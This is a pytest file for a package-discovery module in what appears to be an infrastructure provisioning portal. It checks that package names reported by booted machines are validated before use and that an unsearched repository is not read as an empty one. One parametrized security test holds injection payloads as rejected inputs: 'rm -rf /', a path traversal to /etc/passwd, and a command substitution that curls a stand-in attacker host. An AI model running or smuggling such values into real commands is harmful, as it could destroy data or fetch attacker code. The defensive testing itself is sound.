"""Stop curating a dictionary; ask the machine (C7).

REQ-2026-0188 asked for RabbitMQ. The agent guessed `dnf install rabbitmq`,
booted a real machine, and the report came back:

    package rabbitmq is not installed
    rabbitmq NOT INSTALLED
    PORTAL FAILURE: package install did not complete

True, useless, and the end of the road — no vendor repository for RabbitMQ, no
archive, so the ladder was one rung long and the request went to manual
fulfilment. Meanwhile the machine writing that sentence was running Oracle Linux
with dnf and the complete repository metadata in front of it, and the answer it
was never asked for is `rabbitmq-server`.

C6e generalised the LADDER and left the KNOWLEDGE hand-written, so every new
component cost one failed request plus a row typed into a dictionary by a human.
This is the rule that replaces the dictionary.

THE SECURITY LINE, and it is the whole reason this is not simply "install what
you found": the machine REPORTS, it never installs what it discovered in the
same boot. A name found at run time has passed no allow-list. It comes back
here, goes through `profile_rules` exactly as a drafted profile does, and is
installed — if at all — on the next rung, on a machine built for the purpose.
"""

from __future__ import annotations

import pytest

from api import discovery
from common import profile_rules

RABBITMQ = """os_family=rhel
technologies=rabbitmq
--- packages ---
package rabbitmq is not installed
rabbitmq NOT INSTALLED
--- available ---
available_rabbitmq=rabbitmq-server|ol9_developer_EPEL
--- versions ---
version_rabbitmq=MISSING (rabbitmq)
--- services ---
rabbitmq=inactive
--- ports ---
opened_ports=5672,15672,25672
"""


# --- reading what the machine said --------------------------------------------

def test_the_machine_names_the_package_the_guess_missed():
    """THE point of the increment. Nobody wrote `rabbitmq-server` down."""
    finding = discovery.read(RABBITMQ, ["rabbitmq"])["rabbitmq"]
    assert finding.package == "rabbitmq-server"
    assert finding.usable


def test_it_reports_which_repository_the_package_lives_in():
    finding = discovery.read(RABBITMQ, ["rabbitmq"])["rabbitmq"]
    assert finding.repo_id == "ol9_developer_EPEL"
    assert finding.needs_epel


def test_the_ports_the_software_actually_opened_come_back_too():
    """RabbitMQ's real report had an EMPTY ports section, because the drafted
    profile declared none — so even a successful install would have certified a
    broker nothing could reach."""
    assert discovery.read(RABBITMQ, ["rabbitmq"])["rabbitmq"].ports == [
        5672, 15672, 25672]


def test_a_machine_that_found_nothing_says_so_without_inventing():
    finding = discovery.read("available_rabbitmq=none", ["rabbitmq"]).get("rabbitmq")
    assert finding is None or not finding.usable


def test_no_baseline_is_not_the_same_fact_as_no_new_ports():
    """`unknown` means nobody measured; `none` means nothing opened. Reading the
    first as the second is how a missing measurement becomes a measured zero."""
    assert discovery.read("opened_ports=unknown", ["x"]) == {}
    assert discovery._ports("unknown") == []
    assert discovery._ports("none") == []


def test_a_hyphenated_catalogue_code_is_matched_back_correctly():
    """`report_key` is lossy — oracle-db and oracle_db both report as
    oracle_db — so findings are keyed by the ORIGINAL code."""
    report = "available_oracle_db=oracle-database|ol9_appstream"
    assert "oracle-db" in discovery.read(report, ["oracle-db"])


# --- the security line --------------------------------------------------------

@pytest.mark.parametrize("value", [
    "x; rm -rf /|epel",
    "../../etc/passwd|epel",
    "$(curl http://attacker/x)|epel",
    "rabbitmq server|epel",
    "|epel",
])
def test_a_package_name_from_a_machine_is_not_trusted(value):
    """This name is handed to dnf as root on the next rung. It arrived as text
    written by a machine and read out of object storage."""
    finding = discovery.read(f"available_rabbitmq={value}", ["rabbitmq"]).get("rabbitmq")
    assert finding is None, f"{value!r} would have reached a package manager"


def test_a_machine_cannot_nominate_a_publisher_to_trust():
    """A release package installs a repository AND its signing key, so root
    would trust that publisher for everything it ever serves. The machine may
    say WHICH KNOWN repository a package came from; it may not name a new one."""
    finding = discovery.read(
        "available_rabbitmq=rabbitmq-server|attacker-repo", ["rabbitmq"])["rabbitmq"]
    assert not finding.usable, "an unknown repository was accepted"
    assert discovery.profile_from(finding) is None


def test_the_release_package_is_a_fixed_name_never_a_reported_one():
    finding = discovery.read(
        "available_rabbitmq=rabbitmq-server|epel", ["rabbitmq"])["rabbitmq"]
    profile = discovery.profile_from(finding)
    assert profile["repo"]["release_package"] in profile_rules.RELEASE_PACKAGES


def test_a_profile_built_from_a_finding_faces_the_same_rules_as_any_other():
    finding = discovery.read(RABBITMQ, ["rabbitmq"])["rabbitmq"]
    profile = discovery.profile_from(finding)
    assert profile_rules.profile_problems(profile) == [], (
        profile_rules.profile_problems(profile))


def test_a_base_repository_package_needs_no_repository_added():
    """Not everything discovered is in EPEL. A package already reachable needs
    no standing grant of trust, and adding one would be a cost with no benefit."""
    finding = discovery.read(
        "available_httpd=httpd|ol9_appstream", ["httpd"])["httpd"]
    assert not finding.usable, (
        "a repository we have no sanctioned way to enable was treated as usable")


def test_a_package_with_no_repository_named_is_taken_as_already_reachable():
    finding = discovery.read("available_nginx=nginx|", ["nginx"])["nginx"]
    profile = discovery.profile_from(finding)
    assert profile is not None and "repo" not in profile


# --- what the drafted profile claims ------------------------------------------

def test_the_profile_promises_no_version_it_did_not_measure():
    """A repository serves whatever is current. Inventing an `expects` here
    would repeat REQ-2026-0185 exactly — Vault 2.0.4 installed perfectly and was
    failed for not being the version this code recalled."""
    finding = discovery.read(RABBITMQ, ["rabbitmq"])["rabbitmq"]
    profile = discovery.profile_from(finding)
    assert not profile.get("expects")
    assert profile["version_command"], "the machine must still be asked"


def test_the_note_says_the_facts_were_measured_and_by_what():
    """A reader of the generated store must be able to tell what a machine
    established from what a model guessed."""
    finding = discovery.read(RABBITMQ, ["rabbitmq"])["rabbitmq"]
    note = discovery.profile_from(finding)["_note"]
    assert "measured" in note and "rabbitmq-server" in note
    assert "ol9_developer_EPEL" in note


# --- three states, and none of them may collapse into another ------------------
#
# This block exists because a plant test on 2026-08-23 deleted the "was it even
# asked" guard and NOTHING FAILED — the judgement lived in a closure inside
# api.main that no test could reach. Untestable logic is untested logic.

SEARCHED_AND_FOUND = ("--- available ---\n"
                      "available_rabbitmq=rabbitmq-server|epel\n"
                      "opened_ports=5672\n")
# `queryable_` included: since REQ-2026-0189 a bare `none` settles nothing — the
# machine has to show that its search COULD have found something. A report
# without it came from a machine that did not report its own working, and is
# treated as not having answered rather than as having answered "no".
SEARCHED_AND_EMPTY = ("--- available ---\nqueryable_rabbitmq=yes\n"
                      "epel_rabbitmq=added\n"
                      "searched_rabbitmq=ol9_baseos_latest,ol9_developer_EPEL\n"
                      "available_rabbitmq=none\n")
NEVER_ASKED = "rabbitmq NOT INSTALLED\nrabbitmq=inactive\n"


def test_a_package_that_was_found_comes_back_as_something_to_try():
    assert discovery.finding_for(SEARCHED_AND_FOUND, "rabbitmq") == {
        "package": "rabbitmq-server", "repo_id": "epel", "ports": [5672]}


def test_looked_and_found_nothing_is_an_answer_not_an_absence():
    """`{}` — falsy, so no rung is added, but NOT None: a machine settled this
    and re-buying it would cost one per request for ever."""
    assert discovery.finding_for(SEARCHED_AND_EMPTY, "rabbitmq") == {}


def test_never_asked_is_distinct_from_found_nothing():
    """THE distinction the plant erased. Every report written before C7 looks
    like this, and reading it as "found nothing" would strand RabbitMQ in manual
    fulfilment for thirty days on a verdict about a question never put."""
    assert discovery.finding_for(NEVER_ASKED, "rabbitmq") is None


def test_a_report_that_was_searched_for_another_technology_is_not_an_answer_here():
    """The section exists, but not about this code — so nothing was established
    about it either way, and only `None` says that honestly.

    This asserted `{}` for one afternoon, contradicting its own docstring. The
    soundness rule caught it: with no `queryable_rabbitmq` line there is no
    evidence that anything was ever asked ABOUT RABBITMQ.
    """
    assert discovery.finding_for(
        "--- available ---\navailable_nginx=nginx|ol9_appstream\n",
        "rabbitmq") is None


def test_an_empty_report_is_never_read_as_a_settled_fact():
    for empty in ("", None):
        assert discovery.finding_for(empty, "rabbitmq") is None


# --- a negative is only a fact if the search could have found something --------
#
# REQ-2026-0189, the first real run of C7. The machine reported
#
#     available_rabbitmq=none
#
# and nothing could say whether RabbitMQ is genuinely absent from Oracle Linux's
# repositories and EPEL, or whether the EPEL step failed and only the base
# repositories were ever searched — every command in that block ends in
# `|| true`. That is the same defect this increment exists to end, committed in
# the fixing of it: a missing measurement reading as a measured zero.
#
# The machine now reports its own working, so `none` can be believed or not on
# evidence rather than on hope.

def _report(queryable="yes", epel="added", available="none", extra="",
            searched="ol9_baseos_latest,ol9_developer_EPEL"):
    return ("--- available ---\n"
            f"queryable_rabbitmq={queryable}\n"
            f"epel_rabbitmq={epel}\n"
            f"searched_rabbitmq={searched}\n"
            f"available_rabbitmq={available}\n" + extra)


def test_a_sound_search_that_found_nothing_is_a_settled_fact():
    """Control probe passed, EPEL arrived, still nothing. That is worth
    remembering — re-buying it would cost a machine per request."""
    assert discovery.finding_for(_report(), "rabbitmq") == {}
    assert discovery.search_was_sound(_report(), "rabbitmq")


def test_a_search_whose_query_was_broken_is_not_an_answer():
    """If repoquery cannot find `bash` — which is in the base repositories of
    every image this portal builds — it could not have found anything."""
    assert discovery.finding_for(_report(queryable="no"), "rabbitmq") is None


def test_a_search_that_never_reached_epel_is_only_half_a_search():
    """`unavailable` means only Oracle's own repositories were consulted.
    Recording that as "this software does not exist" would take a working
    component off the menu for thirty days on the strength of our own bug."""
    assert discovery.finding_for(_report(epel="unavailable"), "rabbitmq") is None


def test_a_search_answered_before_epel_was_needed_is_still_sound():
    """No `epel_` line at all means the configured repositories answered first,
    which is a complete search by definition — not a missing step."""
    report = ("--- available ---\nqueryable_rabbitmq=yes\n"
              "searched_rabbitmq=ol9_baseos_latest,ol9_appstream\n"
              "available_rabbitmq=none\n")
    assert discovery.search_was_sound(report, "rabbitmq")
    assert discovery.finding_for(report, "rabbitmq") == {}


def test_a_found_package_is_taken_even_from_an_unusual_search():
    """The soundness rule guards NEGATIVES. A package the machine actually found
    is a positive fact and needs no alibi."""
    found = _report(queryable="no", epel="unavailable",
                    available="rabbitmq-server|epel", extra="opened_ports=5672\n")
    assert discovery.finding_for(found, "rabbitmq") == {
        "package": "rabbitmq-server", "repo_id": "epel", "ports": [5672]}


def test_the_working_report_uses_words_the_verdict_does_not_read_as_broken():
    """`epel_x=failed` would make verdict() call the machine unhealthy, failing
    a proof because a diagnostic step did not complete — a false alarm costing
    exactly as much trust as a missed failure."""
    from orchestrator import boot_reports
    for value in ("present", "added", "unavailable"):
        assert boot_reports.verdict(f"epel_rabbitmq={value}\n")["ok"] is True
    for value in ("yes", "no"):
        assert boot_reports.verdict(f"queryable_rabbitmq={value}\n")["ok"] is True


# --- installed is not enabled (REQ-2026-0190) ---------------------------------

def _r(**kw):
    parts = ["--- available ---", "queryable_rabbitmq=yes"]
    for k, v in kw.items():
        if v is not None:
            parts.append(f"{k}_rabbitmq={v}")
    parts.append("available_rabbitmq=none")
    return "\n".join(parts) + "\n"


def test_epel_installed_but_not_in_the_searched_list_is_not_an_answer():
    """EXACTLY what REQ-2026-0190 could not distinguish. The release package was
    present, the query worked, nothing was found — and EPEL may never have been
    consulted at all."""
    report = _r(epel="present", searched="ol9_baseos_latest,ol9_appstream")
    assert not discovery.search_was_sound(report, "rabbitmq")
    assert discovery.finding_for(report, "rabbitmq") is None


def test_epel_present_and_searched_is_a_complete_search():
    report = _r(epel="present", searched="ol9_baseos_latest,ol9_developer_EPEL")
    assert discovery.search_was_sound(report, "rabbitmq")
    assert discovery.finding_for(report, "rabbitmq") == {}


def test_a_report_that_cannot_name_where_it_looked_settles_nothing():
    """The very report REQ-2026-0190 produced: no `searched_` line at all."""
    assert discovery.finding_for(_r(epel="present"), "rabbitmq") is None
    assert discovery.finding_for(_r(epel="present", searched="unknown"),
                                 "rabbitmq") is None


def test_a_search_that_never_needed_epel_needs_no_epel_in_the_list():
    """The configured repositories answered first, so there is nothing to
    corroborate — requiring EPEL there would refuse every sound base-repo
    answer."""
    report = _r(searched="ol9_appstream")
    assert discovery.search_was_sound(report, "rabbitmq")
